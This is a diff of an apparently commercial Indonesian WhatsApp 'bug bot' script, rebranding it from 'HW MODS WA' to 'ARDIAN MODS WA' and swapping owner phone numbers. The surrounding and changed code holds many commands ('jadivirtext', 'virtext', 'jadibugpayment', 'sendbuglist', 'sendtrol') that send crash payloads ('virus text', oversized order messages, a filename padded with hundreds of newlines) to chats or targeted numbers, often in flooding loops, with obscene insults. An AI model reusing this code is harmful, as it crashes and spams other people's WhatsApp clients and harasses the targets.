@@ -2,11 +2,11 @@
 // Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
    Apalagi Lari Dari Tanggung Jawab
 
-// Base HW MODS WAHW MODS WA : Copyan Dari Base Dika
+// Base ARDIAN MODS WA ARDIAN MODS WA : Copyan Dari Base Ardian
 
-› Create By HW MODS WA
-› Base Ori HW MODS WA
-› Copyan Base Dika Hisoka Morou
+› Create By ARDIAN MODS WA
+› Base Ori ARDIAN MODS WA
+› Copyan Base Ardian Hisoka Morou
 
 🌷 KALAU MAU RENAME TARO CREDITS GUA : HW MODS WA*/
 
@@ -175,8 +175,8 @@ const anakau = {
 video:fs.readFileSync("./baseikal/video/haikal.mp4"),
 gifPlayback:true,
 jpegThumbnail:log0,
-caption:`Haii 👋 Kak ${pushname} Selamat ${salam} *Aku Adalah Bot HW MODS WA*
-Agar Bot Bisa Di Gunakan Silahkan Meminta Pasword Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot HW MODS WA'
+caption:`Haii 👋 Kak ${pushname} Selamat ${salam} *Aku Adalah Bot ARDIAN MODS WA*
+Agar Bot Bisa Di Gunakan Silahkan Meminta Pasword Kepada Owner Terlebih Dahulu Agar Bisa Menggunakan Bot ARDIAN MODS WA'
  `
 }
 haikal.sendMessage(m.chat, anakau, {quoted: m})
@@ -305,7 +305,7 @@ switch(command) {
 //BUG PUBLIC
 case 'jaditroli': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -319,7 +319,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${teks}`,
 "orderTitle": `${teks}`,
-"sellerJid": "6281214281312@s.whatsapp.net",
+"sellerJid": "628386413714@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: m })
@@ -331,7 +331,7 @@ break
 case 'jadilokas': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -352,7 +352,7 @@ break
 case 'jadipolling': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -390,7 +390,7 @@ break
 case 'jadidocu': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -415,7 +415,7 @@ break
 case 'jadidarknes': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -440,7 +440,7 @@ break
 case 'jadivirtext1': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone}` }, { quoted: m })
@@ -451,7 +451,7 @@ break
 case 'jadivirtext2': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone1}` }, { quoted: m })
@@ -462,7 +462,7 @@ break
 case 'jadivirtex3t': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone2}` }, { quoted: m })
@@ -473,7 +473,7 @@ break
 case 'jadivirtext4': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone3}` }, { quoted: m })
@@ -484,7 +484,7 @@ break
 case 'jadivirtext5': {
 
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone4}` }, { quoted: m })
@@ -494,7 +494,7 @@ break
 //=================================================//
 case 'jadivirtext6': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone5}` }, { quoted: m })
@@ -504,7 +504,7 @@ break
 //=================================================//
 case 'jadivirtext7': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${iphone6}` }, { quoted: m })
@@ -514,7 +514,7 @@ break
 //=================================================//
 case 'jadivirtext8': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${buttonkal}` }, { quoted: m })
@@ -524,7 +524,7 @@ break
 //=================================================//
 case 'jadivirtext9': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${buttonvirus}` }, { quoted: m })
@@ -534,7 +534,7 @@ break
 //=================================================//
 case 'jadivirtext10': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted: m })
@@ -544,7 +544,7 @@ break
 //=================================================//
 case 'jadibuginvite': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -565,13 +565,13 @@ break
 //=================================================//
 case 'jadibugpayment' : {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
-haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
+haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC ARDIAN MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/@HwModsWa857`,
+sourceUrl: `https://youtube.com/@ardianstore_`,
 thumbnailUrl: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg', 
 }
 }}}}}, { quoted:m})
@@ -582,7 +582,7 @@ break
 //=================================================//
 case 'jadibugsw': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 joau = fs.readFileSync('./baseikal/video/haikal.mp4')
@@ -593,7 +593,7 @@ break
 //=================================================//
 case 'jadibugbutton':
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
 const buttonssk = [
@@ -616,14 +616,14 @@ case 'sendbuglist':
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 touchmebre = [
 {
-title: `🌷 HW MODS WA WA 🌷 ${buttonvirus} ${buttonvirus}`,
+title: `🌷 ARDIAN MODS WA WA 🌷 ${buttonvirus} ${buttonvirus}`,
 rows: [
 {title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
 {title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
 ]
 }
 ]
-haikal.sendListMsg(Pe, `🌷 HW MODS WA WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
+haikal.sendListMsg(Pe, `🌷 ARDIAN MODS WA WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
 break
 //=================================================//
 case 'sendtrol': {
@@ -637,9 +637,9 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY HW MODS WA",
+"message": " BY ARDIAN",
 "orderTitle": " BUG TROLI ", // 
-"sellerJid": "6281214281312@s.whatsapp.net",
+"sellerJid": "628386413714@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: m})
@@ -680,7 +680,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 HW MODS WA☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 ARDIAN MODS WA☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -696,7 +696,7 @@ case 'virtext1': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone}` }, { quoted: m })
 }
 }
 break
@@ -706,7 +706,7 @@ case 'virtext2': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone1}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone1}` }, { quoted: m })
 }
 }
 break
@@ -716,7 +716,7 @@ case 'virtext3': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone2}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone2}` }, { quoted: m })
 }
 }
 break
@@ -726,7 +726,7 @@ case 'virtext4': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone3}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone3}` }, { quoted: m })
 }
 }
 break
@@ -736,7 +736,7 @@ case 'virtext5': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone4}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone4}` }, { quoted: m })
 }
 }
 break
@@ -746,7 +746,7 @@ case 'virtext6': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone5}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone5}` }, { quoted: m })
 }
 }
 break
@@ -756,7 +756,7 @@ case 'virtext7': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${iphone6}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${iphone6}` }, { quoted: m })
 }
 }
 break
@@ -766,7 +766,7 @@ case 'virtext8': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${buttonkal}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${buttonkal}` }, { quoted: m })
 }
 }
 break
@@ -776,7 +776,7 @@ case 'virtext9': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${buttonvirus}` }, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${buttonvirus}` }, { quoted: m })
 }
 }
 break
@@ -786,14 +786,14 @@ case 'virtext10': {
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `HW MODS WA${ngazap(prefix)}`}, { quoted: m })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg' }, caption: `ARDIAN MODS WA${ngazap(prefix)}`}, { quoted: m })
 }
 }
 break
 //=================================================//
 case 'jadijago': {
 
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ardian`)
 let teks = `${q}`
 {
  var message = {
@@ -822,7 +822,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© HW MODS WA${ngazap(prefix)}`,
+"caption": `© ARDIAN MODS WA${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -840,7 +840,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© HW MODS WA${ngazap(prefix)}`,
+"caption": `© ARDIAN MODS WA${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: m})
@@ -860,10 +860,10 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© HW MODS WA${ngazap(prefix)}`,
+"message": `© ARDIAN MODS WA${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© HW MODS WA${ngazap(prefix)}`,
-"sellerJid": "6285714170944@s.whatsapp.net",
+"orderTitle": `© ARDIAN MODS WA${ngazap(prefix)}`,
+"sellerJid": "628386413714@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -878,7 +878,7 @@ case 'afk': {
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-m.reply(`${m.pushName} Hello Saya Bot HW MODS WA${text ? ': ' + text : ''}`)
+m.reply(`${m.pushName} Hello Saya Bot ARDIAN MODS WA${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
@@ -886,7 +886,7 @@ case 'button':
 
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku haikal`
+ydd = `Hallo Aku ardian`
 for (let i = 0; i < jumlah; i++) {
 const buttons = [
 {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
@@ -958,7 +958,7 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER HW MODS WA`,
+"text": `MY DEVELOPER ARDIAN MODS WA`,
 }
 }}), { userJid: m.chat, quoted: m})
 haikal.relayMessage(Pe, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -976,7 +976,7 @@ for (let i = 0; i < jumlah; i++) {
 haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/@HwModsWa857`,
+sourceUrl: `https://youtube.com/@ardianstore_`,
 thumbnailUrl: 'https://telegra.ph/file/cbe07e74d9fd5d5eefa49.jpg', 
 }
 }}}}}, { quoted:m})
@@ -988,10 +988,10 @@ case '🌷' : {
 
 Pe = text.split("|")[0]+'@s.whatsapp.net'
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -999,10 +999,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1010,10 +1010,10 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1021,10 +1021,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
-{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
+{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6283183387983'}},
 { urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
 { quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
 { quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
@@ -1032,10 +1032,10 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: 'POWERED BY ARDIAN /> ZERO TO HERO', 
 templateButtons: [
